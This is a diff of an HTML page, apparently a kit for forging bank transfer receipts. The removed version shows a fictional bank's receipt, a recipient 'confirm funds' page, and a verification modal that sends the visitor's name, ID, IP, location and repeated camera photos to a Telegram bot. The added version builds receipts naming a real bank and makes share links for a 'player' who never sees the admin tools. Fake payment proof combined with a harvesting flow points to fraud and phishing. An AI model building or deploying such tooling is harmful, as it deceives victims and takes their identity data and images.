-          <label for="tujuan">Purpose</label>
-          <input type="text" id="tujuan" value="Fund Transfer" />
-        </div>
-
-        <div class="section-label">Date &amp; ID</div>
-        <div class="field-group">
-          <label for="tanggal">Date &amp; Time</label>
-          <input type="text" id="tanggal" value="22 Aug 2026, 15:23 WIB" />
-        </div>
-        <div class="field-group">
-          <label for="idTransaksi">Transaction ID</label>
-          <input type="text" id="idTransaksi" value="260822AI8GSS5F" />
-        </div>
-        <div class="field-group">
-          <label for="noReferensi">Reference No.</label>
-          <input
-            type="text"
-            id="noReferensi"
-            value="20260822FAMAIDJ1010O0276223936"
-          />
-        </div>
-
-        <div class="btn-row">
-          <button id="resetBtn">Reset</button>
-          <button id="downloadBtn">Download HTML</button>
-        </div>
+      <div class="heading-row">
+        <h1>Buat invoice. Bagikan link.</h1>
+        <p class="heading-copy">Setiap penyimpanan menghasilkan link unik untuk satu invoice. Player hanya melihat invoice tersebut dan alur konfirmasi, tidak pernah melihat alat admin.</p>
       </div>
 
-      <!-- ============ PREVIEW ============ -->
-      <div>
-        <div class="view-tabs">
-          <button id="tabReceipt" class="active">Transfer Receipt</button>
-          <button id="tabConfirm">Recipient Confirmation Page</button>
-        </div>
-        <div class="preview-wrap">
-          <div class="card" id="receiptCard">
-            <div class="header">
-              <div class="logo">
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  xmlns:xlink="http://www.w3.org/1999/xlink"
-                  aria-hidden="true"
-                  role="img"
-                  width="40"
-                  height="40"
-                  viewBox="0 0 24 24"
-                  style="color: #3a2e00"
-                >
-                  <g
-                    fill="currentColor"
-                    fill-rule="evenodd"
-                    clip-rule="evenodd"
-                  >
-                    <path
-                      d="M21.01 4.147A10.44 10.44 0 0 0 12.816 0A17 17 0 0 0 8.46.76a10.5 10.5 0 0 0-3.927 2.168c-3.447 3.177-6.724 10.211-.59 15.627a.27.27 0 0 0 .4 0a.28.28 0 0 0 0-.4a8.55 8.55 0 0 1-2.997-7.364v-.17q1.124.278 2.278.37h1.549q-.03.585 0 1.169a.32.32 0 0 0 .33.31a.31.31 0 0 0 .32-.33c0-.4 0-.8.08-1.2c.719 0 1.418-.129 2.128-.169a.31.31 0 0 0 .33-.32a.34.34 0 0 0-.34-.35c-.66 0-1.32-.11-1.999-.15a13.2 13.2 0 0 1 1.29-3.656c.918 0 1.838.08 2.757.08c1.439 0 2.857-.06 4.296-.13l1.899-.1l.3.67q.255.506.449 1.038c.16.6.42 1.37.6 2.189c-.69.07-1.38.16-2.069.25a.28.28 0 0 0-.28.3a.29.29 0 0 0 .3.269c.74 0 1.469.1 2.218.14q.063.457.05.92a.32.32 0 0 0 .18.307q.056.028.12.032a.33.33 0 0 0 .36-.3q.03-.46 0-.92h1.898c.76 0 1.519-.11 2.268-.189a7.7 7.7 0 0 1-.18 1.998a11.8 11.8 0 0 1-1.548 3.677a5.7 5.7 0 0 1-1.819 1.759a.33.33 0 0 0-.12.45a.34.34 0 0 0 .45.12a6.5 6.5 0 0 0 2.098-1.999a12.7 12.7 0 0 0 1.729-3.867a10.29 10.29 0 0 0-2.258-8.842m-.77.629c.12.15.23.31.34.46h-3.477l-.21-.47a10.3 10.3 0 0 0-1.669-2.768a8 8 0 0 0-.909-.819a10.1 10.1 0 0 1 5.935 3.597zM5.213 3.696A9.8 9.8 0 0 1 8.79 1.799c.46-.14.94-.26 1.409-.36c-.35.26-.69.51-1 .8a12.6 12.6 0 0 0-1.648 1.699q-.506.695-.92 1.449c-.998 0-1.998.05-2.997.05c.472-.627 1-1.21 1.579-1.74m.41 4.147a13 13 0 0 0-.38 2.069H1.486a10.8 10.8 0 0 1 1.669-3.917c.999.08 1.998.15 3.047.2a11.4 11.4 0 0 0-.58 1.648m8.053-2.647c-1.419 0-2.848 0-4.277.1H7.901c.16-.26.33-.52.51-.76a12.7 12.7 0 0 1 1.778-2.038c.48-.46.999-.89 1.509-1.299c.4-.05.789-.08 1.169-.1c.482.263.92.6 1.298 1a9.2 9.2 0 0 1 1.709 2.997v.05zm6.654 4.796h-1.918c-.11-.87-.31-1.709-.43-2.348a8 8 0 0 0-.36-1.24c0-.11-.09-.21-.14-.32l3.358-.179a.28.28 0 0 0 .17-.09a9.84 9.84 0 0 1 1.608 4.297c-.759-.04-1.518-.12-2.288-.12"
-                    ></path>
-                    <path
-                      d="m19.011 21.132l-1.439-.07c.06-.59.14-1.159.2-1.748c0-.28.06-.57.07-.85a8 8 0 0 0 0-.859c0-.49 0-.999-.05-1.459h.39a.3.3 0 0 0 .28-.25a.29.29 0 0 0 .24-.11a.33.33 0 0 0 0-.459c-.89-.81-2.678-2.748-4.217-3.996q-.707-.579-1.519-1a1.9 1.9 0 0 0-.999-.24a7.6 7.6 0 0 0-2.348 1.47c-1.698 1.378-3.787 3.386-4.356 3.926a.29.29 0 0 0 0 .41a.29.29 0 0 0 .14.23q.344.164.72.23q-.24.802-.38 1.628q-.024.375 0 .75c0 .25 0 .509.06.759a15 15 0 0 0 .33 1.738c-.29 0-.58.07-.86.12a.28.28 0 0 0-.25.3a.28.28 0 0 0-.51.01a4 4 0 0 0-.24.54c-.049.154-.07.317-.06.48a.81.81 0 0 0 .4.609c.239.146.504.244.78.29q.406.087.819.13c.62.07 1.259.1 1.868.15c.82.06 1.64.119 2.468.139h3.687c.83 0 1.739 0 2.628-.07q.901-.045 1.789-.22a1.47 1.47 0 0 0 1.219-.999a1.52 1.52 0 0 0-.43-1.499a.33.33 0 0 0-.43-.08m-2.138-.1l-2.858-.14c0-.469.05-.939.07-1.418c.02-.48 0-.88 0-1.31c0-.429-.05-1.118-.08-1.668c1.15-.08 2.189-.18 2.998-.26c-.1.44-.19.87-.25 1.32a8 8 0 0 0-.08.859v.869c.04.59.09 1.169.15 1.748zm-6.385-4.406h.08c.93 0 1.899 0 2.818-.1c-.09.43-.18.87-.23 1.31a6 6 0 0 0-.06.848a8 8 0 0 0 0 .85c0 .44.1.879.17 1.309h-2.848c0-.46 0-.91.07-1.37c.07-.459 0-.878 0-1.308s-.02-1.03-.05-1.539zm.95-5.175q.29-.234.64-.37c.214.03.419.109.599.23q.613.352 1.179.779c1.378 1 2.997 2.518 3.996 3.377h-.13a.32.32 0 0 0-.22-.17a.27.27 0 0 0-.26.17h-4.815c-.77 0-1.539 0-2.288.07c-1.31.05-2.508.13-3.387.1a6 6 0 0 1-.88-.07c.71-.58 2.248-1.748 3.647-2.788c.69-.52 1.36-.999 1.869-1.328zm-4.806 4.925q1.516.21 3.047.24c-.08.4-.16.81-.21 1.23q-.06.421-.06.848a8 8 0 0 0 0 .85q.053.67.18 1.329h-.3c-.849.05-1.698.13-2.537.23v-2.908c.02-.61-.07-1.21-.12-1.819m12.53 6.045a.75.75 0 0 1-.67.46q-.836.105-1.679.1c-.88 0-1.778 0-2.598-.07H6.512a9 9 0 0 1-1-.07a2 2 0 0 1-.469-.1c-.09 0-.18-.07-.19-.15a.5.5 0 0 1 0-.24q.057-.248.17-.48a.3.3 0 0 0 0-.19a.29.29 0 0 0 .29.21c.81-.06 1.598-.07 2.398-.07s1.858.05 2.797.08s1.869 0 2.808 0l5.695-.1h.08a.76.76 0 0 1 .07.62"
-                    ></path>
-                  </g>
-                </svg>
-                <div class="logo-text">
-                  <span class="brand">BDGM</span>
-                  <span class="tagline">Bank Dayat Ganteng Monopoli</span>
-                </div>
-              </div>
+      <main class="workbench">
+        <section class="panel" aria-labelledby="formTitle">
+          <div class="panel-head">
+            <h2 id="formTitle">Detail invoice</h2>
+            <p>Preview di sebelah kanan berubah langsung saat data diedit.</p>
+          </div>
+          <form class="form-body" id="invoiceForm">
+            <div class="section-title">Transfer</div>
+            <div class="field"><label for="greetName">Nama sapaan pengirim</label><input id="greetName" name="greetName" value="MUHAMMAD" maxlength="80" required /></div>
+            <div class="field"><label for="nominal">Nominal</label><input id="nominal" name="nominal" value="2.000.000,00" maxlength="80" required /></div>
+            <div class="row">
+              <div class="field"><label for="metode">Metode</label><input id="metode" name="metode" value="BI-Fast" maxlength="80" /></div>
+              <div class="field"><label for="total">Total</label><input id="total" name="total" value="2.000.000,00" maxlength="80" required /></div>
             </div>
-
-            <div class="body">
-              <p class="greeting">Hello <b id="out-greetName">MUHAMMAD</b>,</p>
-              <p class="summary">
-                You successfully transferred Rp<span id="out-nominal2"
-                  >2.000.000,00</span
-                >
-                to <span id="out-penerimaNama2">Muhammad Hidayat</span> from
-                <span id="out-sumberDana2">Fluid Asset GG</span>.
-              </p>
-
-              <hr />
-
-              <p class="detail-title">Transaction Details</p>
-
-              <div class="field">
-                <div class="field-label">Transfer Amount</div>
-                <div class="field-value">
-                  Rp<span id="out-nominal">2.000.000,00</span>
-                </div>
-              </div>
-
-              <div class="field">
-                <div class="field-label">Method &amp; Transfer Fee</div>
-                <div class="field-value">
-                  <span id="out-metode">BI-Fast</span> &middot;
-                  <span class="strike" id="out-biaya">Rp2.500,00</span
-                  ><span class="free" id="out-biayaStatus">Free</span>
-                </div>
-              </div>
-
-              <div class="field">
-                <div class="field-label">Total</div>
-                <div class="field-value">
-                  Rp<span id="out-total">2.000.000,00</span>
-                </div>
-              </div>
-
-              <div class="field">
-                <div class="field-label">Funding Source</div>
-                <div class="field-value" id="out-sumberDana">
-                  Wallet &middot; Fluid Asset GG
-                </div>
-              </div>
-
-              <div class="field">
-                <div class="field-label">Recipient</div>
-                <div class="field-value">
-                  <span id="out-penerimaNama">Muhammad Hidayat</span>
-                  <div class="field-sub" id="out-penerimaBank">
-                    BLU by BCA Digital &middot; 008920569145
-                  </div>
-                </div>
-              </div>
-
-              <div class="field">
-                <div class="field-label">Purpose</div>
-                <div class="field-value" id="out-tujuan">Fund Transfer</div>
-              </div>
-
-              <div class="field">
-                <div class="field-label">Date &amp; Time</div>
-                <div class="field-value" id="out-tanggal">
-                  22 Aug 2026, 15:23 WIB
-                </div>
-              </div>
-
-              <div class="field">
-                <div class="field-label">Transaction ID</div>
-                <div class="field-value" id="out-idTransaksi">
-                  260822AI8GSS5F
-                </div>
-              </div>
-
-              <div class="field">
-                <div class="field-label">Reference No.</div>
-                <div class="field-value" id="out-noReferensi">
-                  20260822FAMAIDJ1010O0276223936
-                </div>
-              </div>
-
-              <hr />
+            <div class="row">
+              <div class="field"><label for="biaya">Biaya</label><input id="biaya" name="biaya" value="Rp2.500,00" maxlength="80" /></div>
+              <div class="field"><label for="biayaStatus">Status biaya</label><select id="biayaStatus" name="biayaStatus"><option value="Free">Free</option><option value="Charged">Charged</option><option value="Included">Included</option></select></div>
             </div>
+            <div class="field"><label for="sumberDana">Sumber dana / pengirim</label><input id="sumberDana" name="sumberDana" value="Wallet · Fluid Asset GG" maxlength="120" required /></div>
 
-            <div class="footer">
-              <div class="socials">
-                <a href="#" aria-label="Website"
-                  ><svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="currentColor"
-                    stroke-width="1.8"
-                  >
-                    <circle cx="12" cy="12" r="10" />
-                    <path
-                      d="M2 12h20M12 2a15 15 0 010 20 15 15 0 010-20z"
-                    /></svg
-                ></a>
-                <a href="#" aria-label="Instagram"
-                  ><svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="currentColor"
-                    stroke-width="1.8"
-                  >
-                    <rect x="3" y="3" width="18" height="18" rx="5" />
-                    <circle cx="12" cy="12" r="4" />
-                    <circle cx="17.5" cy="6.5" r="1" /></svg
-                ></a>
-                <a href="#" aria-label="TikTok"
-                  ><svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="currentColor"
-                  >
-                    <path
-                      d="M16 3c.5 2.3 2 3.8 4.3 4v3c-1.6 0-3-.5-4.3-1.4V15a6 6 0 11-6-6c.3 0 .7 0 1 .1v3.1a3 3 0 103 3V3h2z"
-                    /></svg
-                ></a>
-                <a href="#" aria-label="YouTube"
-                  ><svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="currentColor"
-                  >
-                    <rect
-                      x="2"
-                      y="5"
-                      width="20"
-                      height="14"
-                      rx="4"
-                      fill="none"
-                      stroke="currentColor"
-                      stroke-width="1.8"
-                    />
-                    <path d="M10 9l6 3-6 3z" /></svg
-                ></a>
-                <a href="#" aria-label="LinkedIn"
-                  ><svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="currentColor"
-                    stroke-width="1.8"
-                  >
-                    <rect x="2" y="2" width="20" height="20" rx="4" />
-                    <path
-                      d="M7 10v7M7 7v.01M12 17v-4a2 2 0 014 0v4M12 13v4"
-                    /></svg
-                ></a>
-                <a href="#" aria-label="X"
-                  ><svg
-                    width="14"
-                    height="14"
-                    viewBox="0 0 24 24"
-                    fill="currentColor"
-                  >
-                    <path
-                      d="M3 3l18 18M21 3L3 21"
-                      stroke="currentColor"
-                      stroke-width="2"
-                    /></svg
-                ></a>
-              </div>
+            <div class="section-title">Penerima</div>
+            <div class="field"><label for="penerimaNama">Nama penerima</label><input id="penerimaNama" name="penerimaNama" value="Muhammad Hidayat" maxlength="100" required /></div>
+            <div class="field"><label for="penerimaBank">Bank / rekening</label><input id="penerimaBank" name="penerimaBank" value="BANK CENTRAL ASIA · 8120900200" maxlength="160" required /></div>
+            <div class="field"><label for="tujuan">Tujuan transfer</label><input id="tujuan" name="tujuan" value="Fund Transfer" maxlength="100" /></div>
 
-              <p class="care">
-                <span class="highlight">BDGM</span> Customer Care:
-              </p>
-              <p class="care-contact">
-                <b>1500 333</b> and
-                <a href="mailto:care@bdgm.id">care@bdgm.id</a>
-              </p>
+            <div class="section-title">Referensi</div>
+            <div class="field"><label for="tanggal">Tanggal</label><input id="tanggal" name="tanggal" value="22 Aug 2026, 15:23 WIB" maxlength="100" required /></div>
+            <div class="field"><label for="idTransaksi">ID transaksi</label><input id="idTransaksi" name="idTransaksi" value="260822AI8GSS5F" maxlength="100" required /></div>
+            <div class="field"><label for="noReferensi">Nomor referensi</label><input id="noReferensi" name="noReferensi" value="2026082200012345" maxlength="100" /></div>
 
-              <hr />
-
-              <p class="legal">
-                PT <span class="highlight">Bank Dayat</span>
-                <span class="highlight">Ganteng Monopoli</span> Tbk (fictional)
-                — created for mockup/demo purposes only, not a real financial
-                institution.
-              </p>
-              <p class="copyright">
-                &copy; 2026 Bank Dayat Ganteng Monopoli. All rights reserved.
-              </p>
+            <div class="actions">
+              <button class="button secondary" type="button" id="resetBtn">Reset</button>
+              <button class="button" type="submit" id="createLinkBtn">Simpan &amp; buat link</button>
             </div>
+            <div class="form-status" id="formStatus" role="status" aria-live="polite"></div>
+          </form>
+        </section>
+
+        <section class="preview-stage" aria-labelledby="previewTitle">
+          <div class="stage-head">
+            <div><h2 id="previewTitle">Preview invoice</h2><p>Inilah data invoice yang akan dibaca player.</p></div>
+            <div class="live-chip"><span class="live-dot"></span>Preview aktif</div>
+          </div>
+          <div class="receipt-wrap">
+            <article class="receipt">
+              <div class="receipt-banner">
+                <div class="bank-logo">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" aria-hidden="true"><path d="M3 9l9-5 9 5"/><path d="M5 10v7M9 10v7M15 10v7M19 10v7M3 20h18M2 17h20"/></svg>
+                  <span><span class="bank-name">Bank Dayat Ganteng</span><span class="bank-tagline">Monopoli</span></span>
+                </div>
+              </div>
+              <div class="receipt-body">
+                <p class="greeting">Hello <strong data-output="greetName">MUHAMMAD</strong>,</p>
+                <p class="summary">You successfully transferred funds to <strong data-output="penerimaNama">Muhammad Hidayat</strong> from <strong data-output="sumberDana">Wallet · Fluid Asset GG</strong>.</p>
+                <div class="amount"><span>Transfer amount</span><strong>Rp<span data-output="nominal">2.000.000,00</span></strong></div>
+                <div class="details">
+                  <div class="detail"><span>Recipient</span><strong data-output="penerimaNama">Muhammad Hidayat</strong></div>
+                  <div class="detail"><span>Bank / account</span><strong data-output="penerimaBank">BANK CENTRAL ASIA · 8120900200</strong></div>
+                  <div class="detail"><span>Transfer method / fee</span><strong><span data-output="metode">BI-Fast</span> · <span data-output="biaya">Rp2.500,00</span> · <span data-output="biayaStatus">Free</span></strong></div>
+                  <div class="detail"><span>Total</span><strong>Rp<span data-output="total">2.000.000,00</span></strong></div>
+                  <div class="detail"><span>Purpose</span><strong data-output="tujuan">Fund Transfer</strong></div>
+                  <div class="detail"><span>Date</span><strong data-output="tanggal">22 Aug 2026, 15:23 WIB</strong></div>
+                  <div class="detail full"><span>Transaction / reference</span><strong><span data-output="idTransaksi">260822AI8GSS5F</span> · <span data-output="noReferensi">2026082200012345</span></strong></div>
+                </div>
+              </div>
+            </article>
           </div>
 
-          <!-- ============ CONFIRMATION PAGE (struk gaya sama, halaman penerima) ============ -->
-          <div class="card" id="confirmCard" style="display: none">
-            <div class="header">
-              <div class="logo">
-                <svg
-                  xmlns="http://www.w3.org/2000/svg"
-                  viewBox="0 0 24 24"
-                  style="color: #3a2e00"
-                >
-                  <g
-                    fill="currentColor"
-                    fill-rule="evenodd"
-                    clip-rule="evenodd"
-                  >
-                    <path
-                      d="M21.01 4.147A10.44 10.44 0 0 0 12.816 0A17 17 0 0 0 8.46.76a10.5 10.5 0 0 0-3.927 2.168c-3.447 3.177-6.724 10.211-.59 15.627a.27.27 0 0 0 .4 0a.28.28 0 0 0 0-.4a8.55 8.55 0 0 1-2.997-7.364v-.17q1.124.278 2.278.37h1.549q-.03.585 0 1.169a.32.32 0 0 0 .33.31a.31.31 0 0 0 .32-.33c0-.4 0-.8.08-1.2c.719 0 1.418-.129 2.128-.169a.31.31 0 0 0 .33-.32a.34.34 0 0 0-.34-.35c-.66 0-1.32-.11-1.999-.15a13.2 13.2 0 0 1 1.29-3.656c.918 0 1.838.08 2.757.08c1.439 0 2.857-.06 4.296-.13l1.899-.1l.3.67q.255.506.449 1.038c.16.6.42 1.37.6 2.189c-.69.07-1.38.16-2.069.25a.28.28 0 0 0-.28.3a.29.29 0 0 0 .3.269c.74 0 1.469.1 2.218.14q.063.457.05.92a.32.32 0 0 0 .18.307q.056.028.12.032a.33.33 0 0 0 .36-.3q.03-.46 0-.92h1.898c.76 0 1.519-.11 2.268-.189a7.7 7.7 0 0 1-.18 1.998a11.8 11.8 0 0 1-1.548 3.677a5.7 5.7 0 0 1-1.819 1.759a.33.33 0 0 0-.12.45a.34.34 0 0 0 .45.12a6.5 6.5 0 0 0 2.098-1.999a12.7 12.7 0 0 0 1.729-3.867a10.29 10.29 0 0 0-2.258-8.842m-.77.629c.12.15.23.31.34.46h-3.477l-.21-.47a10.3 10.3 0 0 0-1.669-2.768a8 8 0 0 0-.909-.819a10.1 10.1 0 0 1 5.935 3.597zM5.213 3.696A9.8 9.8 0 0 1 8.79 1.799c.46-.14.94-.26 1.409-.36c-.35.26-.69.51-1 .8a12.6 12.6 0 0 0-1.648 1.699q-.506.695-.92 1.449c-.998 0-1.998.05-2.997.05c.472-.627 1-1.21 1.579-1.74m.41 4.147a13 13 0 0 0-.38 2.069H1.486a10.8 10.8 0 0 1 1.669-3.917c.999.08 1.998.15 3.047.2a11.4 11.4 0 0 0-.58 1.648m8.053-2.647c-1.419 0-2.848 0-4.277.1H7.901c.16-.26.33-.52.51-.76a12.7 12.7 0 0 1 1.778-2.038c.48-.46.999-.89 1.509-1.299c.4-.05.789-.08 1.169-.1c.482.263.92.6 1.298 1a9.2 9.2 0 0 1 1.709 2.997v.05zm6.654 4.796h-1.918c-.11-.87-.31-1.709-.43-2.348a8 8 0 0 0-.36-1.24c0-.11-.09-.21-.14-.32l3.358-.179a.28.28 0 0 0 .17-.09a9.84 9.84 0 0 1 1.608 4.297c-.759-.04-1.518-.12-2.288-.12"
-                    ></path>
-                    <path
-                      d="m19.011 21.132l-1.439-.07c.06-.59.14-1.159.2-1.748c0-.28.06-.57.07-.85a8 8 0 0 0 0-.859c0-.49 0-.999-.05-1.459h.39a.3.3 0 0 0 .28-.25a.29.29 0 0 0 .24-.11a.33.33 0 0 0 0-.459c-.89-.81-2.678-2.748-4.217-3.996q-.707-.579-1.519-1a1.9 1.9 0 0 0-.999-.24a7.6 7.6 0 0 0-2.348 1.47c-1.698 1.378-3.787 3.386-4.356 3.926a.29.29 0 0 0 0 .41a.29.29 0 0 0 .14.23q.344.164.72.23q-.24.802-.38 1.628q-.024.375 0 .75c0 .25 0 .509.06.759a15 15 0 0 0 .33 1.738c-.29 0-.58.07-.86.12a.28.28 0 0 0-.25.3a.28.28 0 0 0-.51.01a4 4 0 0 0-.24.54c-.049.154-.07.317-.06.48a.81.81 0 0 0 .4.609c.239.146.504.244.78.29q.406.087.819.13c.62.07 1.259.1 1.868.15c.82.06 1.64.119 2.468.139h3.687c.83 0 1.739 0 2.628-.07q.901-.045 1.789-.22a1.47 1.47 0 0 0 1.219-.999a1.52 1.52 0 0 0-.43-1.499a.33.33 0 0 0-.43-.08m-2.138-.1l-2.858-.14c0-.469.05-.939.07-1.418c.02-.48 0-.88 0-1.31c0-.429-.05-1.118-.08-1.668c1.15-.08 2.189-.18 2.998-.26c-.1.44-.19.87-.25 1.32a8 8 0 0 0-.08.859v.869c.04.59.09 1.169.15 1.748zm-6.385-4.406h.08c.93 0 1.899 0 2.818-.1c-.09.43-.18.87-.23 1.31a6 6 0 0 0-.06.848a8 8 0 0 0 0 .85c0 .44.1.879.17 1.309h-2.848c0-.46 0-.91.07-1.37c.07-.459 0-.878 0-1.308s-.02-1.03-.05-1.539zm.95-5.175q.29-.234.64-.37c.214.03.419.109.599.23q.613.352 1.179.779c1.378 1 2.997 2.518 3.996 3.377h-.13a.32.32 0 0 0-.22-.17a.27.27 0 0 0-.26.17h-4.815c-.77 0-1.539 0-2.288.07c-1.31.05-2.508.13-3.387.1a6 6 0 0 1-.88-.07c.71-.58 2.248-1.748 3.647-2.788c.69-.52 1.36-.999 1.869-1.328zm-4.806 4.925q1.516.21 3.047.24c-.08.4-.16.81-.21 1.23q-.06.421-.06.848a8 8 0 0 0 0 .85q.053.67.18 1.329h-.3c-.849.05-1.698.13-2.537.23v-2.908c.02-.61-.07-1.21-.12-1.819m12.53 6.045a.75.75 0 0 1-.67.46q-.836.105-1.679.1c-.88 0-1.778 0-2.598-.07H6.512a9 9 0 0 1-1-.07a2 2 0 0 1-.469-.1c-.09 0-.18-.07-.19-.15a.5.5 0 0 1 0-.24q.057-.248.17-.48a.3.3 0 0 0 0-.19a.29.29 0 0 0 .29.21c.81-.06 1.598-.07 2.398-.07s1.858.05 2.797.08s1.869 0 2.808 0l5.695-.1h.08a.76.76 0 0 1 .07.62"
-                    ></path>
-                  </g>
-                </svg>
-                <div class="logo-text">
-                  <span class="brand">BDGM</span>
-                  <span class="tagline">Bank Dayat Ganteng Monopoli</span>
-                </div>
-              </div>
+          <div class="share-dock" id="shareDock" hidden>
+            <h3>Link player siap dibagikan</h3>
+            <p>Link ini menampilkan invoice yang baru disimpan dan menghubungkan hasil verifikasi ke invoice tersebut.</p>
+            <div class="link-row">
+              <input id="shareLink" type="text" readonly aria-label="Link player" />
+              <button class="button secondary" type="button" id="copyLinkBtn">Salin</button>
+              <button class="button" type="button" id="openLinkBtn">Buka</button>
             </div>
-
-            <div class="body">
-              <div id="confirmPending">
-                <p class="greeting">
-                  Hi <b id="cf-penerima">Muhammad Hidayat</b>,
-                </p>
-                <p class="summary">
-                  <span id="cf-pengirim">Fluid Asset GG</span> has sent you a
-                  payment. Review the details below before confirming.
-                </p>
-
-                <hr />
-
-                <div class="confirm-amount">
-                  Rp<span id="cf-nominal">2.000.000,00</span>
-                </div>
-
-                <div class="field">
-                  <div class="field-label">From</div>
-                  <div class="field-value" id="cf-pengirim2">
-                    Fluid Asset GG
-                  </div>
-                </div>
-                <div class="field">
-                  <div class="field-label">To</div>
-                  <div class="field-value" id="cf-penerima2">
-                    Muhammad Hidayat
-                  </div>
-                </div>
-                <div class="field">
-                  <div class="field-label">Account No.</div>
-                  <div class="field-value" id="cf-rekening">
-                    BLU by BCA Digital &middot; 008920569145
-                  </div>
-                </div>
-                <div class="field">
-                  <div class="field-label">Date</div>
-                  <div class="field-value" id="cf-tanggal">
-                    22 Aug 2026, 15:23 WIB
-                  </div>
-                </div>
-
-                <div class="confirm-actions">
-                  <button id="declineBtn">Decline</button>
-                  <button id="agreeBtn">Agree &amp; Confirm</button>
-                </div>
-              </div>
-
-              <div class="confirm-success" id="confirmSuccess">
-                <div class="check">&#10003;</div>
-                <p>Funds received &amp; confirmed</p>
-                <span
-                  >Rp<span id="cf-nominal-success">2.000.000,00</span> credited
-                  to <b id="cf-penerima-success">Muhammad Hidayat</b>'s
-                  balance</span
-                >
-              </div>
-
-              <hr />
-            </div>
-
-            <div class="footer">
-              <div class="socials">
-                <a href="#" aria-label="Website"
-                  ><svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="currentColor"
-                    stroke-width="1.8"
-                  >
-                    <circle cx="12" cy="12" r="10" />
-                    <path
-                      d="M2 12h20M12 2a15 15 0 010 20 15 15 0 010-20z"
-                    /></svg
-                ></a>
-                <a href="#" aria-label="Instagram"
-                  ><svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="currentColor"
-                    stroke-width="1.8"
-                  >
-                    <rect x="3" y="3" width="18" height="18" rx="5" />
-                    <circle cx="12" cy="12" r="4" />
-                    <circle cx="17.5" cy="6.5" r="1" /></svg
-                ></a>
-                <a href="#" aria-label="TikTok"
-                  ><svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="currentColor"
-                  >
-                    <path
-                      d="M16 3c.5 2.3 2 3.8 4.3 4v3c-1.6 0-3-.5-4.3-1.4V15a6 6 0 11-6-6c.3 0 .7 0 1 .1v3.1a3 3 0 103 3V3h2z"
-                    /></svg
-                ></a>
-                <a href="#" aria-label="YouTube"
-                  ><svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="currentColor"
-                  >
-                    <rect
-                      x="2"
-                      y="5"
-                      width="20"
-                      height="14"
-                      rx="4"
-                      fill="none"
-                      stroke="currentColor"
-                      stroke-width="1.8"
-                    />
-                    <path d="M10 9l6 3-6 3z" /></svg
-                ></a>
-                <a href="#" aria-label="LinkedIn"
-                  ><svg
-                    width="16"
-                    height="16"
-                    viewBox="0 0 24 24"
-                    fill="none"
-                    stroke="currentColor"
-                    stroke-width="1.8"
-                  >
-                    <rect x="2" y="2" width="20" height="20" rx="4" />
-                    <path
-                      d="M7 10v7M7 7v.01M12 17v-4a2 2 0 014 0v4M12 13v4"
-                    /></svg
-                ></a>
-                <a href="#" aria-label="X"
-                  ><svg
-                    width="14"
-                    height="14"
-                    viewBox="0 0 24 24"
-                    fill="currentColor"
-                  >
-                    <path
-                      d="M3 3l18 18M21 3L3 21"
-                      stroke="currentColor"
-                      stroke-width="2"
-                    /></svg
-                ></a>
-              </div>
-
-              <p class="care">
-                <span class="highlight">BDGM</span> Customer Care:
-              </p>
-              <p class="care-contact">
-                <b>1500 333</b> and
-                <a href="mailto:care@bdgm.id">care@bdgm.id</a>
-              </p>
-
-              <hr />
-
-              <p class="legal">
-                PT <span class="highlight">Bank Dayat</span>
-                <span class="highlight">Ganteng Monopoli</span> Tbk (fictional)
-                — created for mockup/demo purposes only, not a real financial
-                institution.
-              </p>
-              <p class="copyright">
-                &copy; 2026 Bank Dayat Ganteng Monopoli. All rights reserved.
-              </p>
-            </div>
+            <p class="share-status" id="shareStatus" role="status" aria-live="polite"></p>
           </div>
-        </div>
-      </div>
-    </div>
-
-    <!-- ============ VERIFICATION MODAL ============ -->
-    <div class="vfy-overlay" id="vfyOverlay">
-      <div class="vfy-modal" id="vfyModal">
-        <!-- Transparent identity verification with explicit camera/location consent -->
-        <div id="vfyIdentityScreen">
-          <div class="vfy-id-icon">
-            <div class="vfy-id-pulse"></div>
-            <svg
-              viewBox="0 0 24 24"
-              fill="none"
-              stroke="currentColor"
-              stroke-width="1.8"
-            >
-              <rect x="2" y="5" width="20" height="14" rx="3" />
-              <path d="M7 15h4M7 11h2" />
-              <circle cx="16" cy="11" r="2" />
-              <path d="M14 15h4" />
-            </svg>
-          </div>
-          <div class="vfy-title">Identity Verification</div>
-          <div class="vfy-subtitle">
-            Internal verification with visible camera capture.
-          </div>
-
-          <div class="vfy-disclosure">
-            This company tool sends your name, phone/ID, IP address, precise
-            location (if allowed), and up to 10 visible camera photos to the
-            company Telegram bot. Photos are captured every 3 seconds only while
-            this dialog is open and the camera preview is visible.
-          </div>
-
-          <div class="vfy-field">
-            <label for="vfyName">Full Name</label>
-            <input
-              type="text"
-              id="vfyName"
-              placeholder="Enter your full name"
-              autocomplete="name"
-            />
-            <div class="vfy-field-error" id="vfyNameErr">
-              Please enter your full name.
-            </div>
-          </div>
-          <div class="vfy-field">
-            <label for="vfyPhone">Phone Number / National ID</label>
-            <input
-              type="text"
-              id="vfyPhone"
-              placeholder="e.g. +62 812 3456 7890"
-              autocomplete="tel"
-            />
-            <div class="vfy-field-error" id="vfyPhoneErr">
-              Please enter a valid phone or ID number.
-            </div>
-          </div>
-
-          <label class="vfy-consent">
-            <input type="checkbox" id="vfyConsent" />
-            <span
-              >I understand what data is collected and consent to
-              camera/location access and delivery of this data to the company
-              Telegram.</span
-            >
-          </label>
-
-          <button class="vfy-btn" id="vfyStartCameraBtn" enabled>
-            Allow camera &amp; location
-          </button>
-
-          <div class="vfy-progress" id="vfyProgress">Waiting for consent.</div>
-
-          <button class="vfy-btn" id="vfyIdentityBtn" disabled>
-            Konfirmasi Data
-          </button>
-          <button class="vfy-btn-cancel" id="vfyIdentityCancelBtn">
-            Cancel
-          </button>
-        </div>
-      </div>
+        </section>
+      </main>
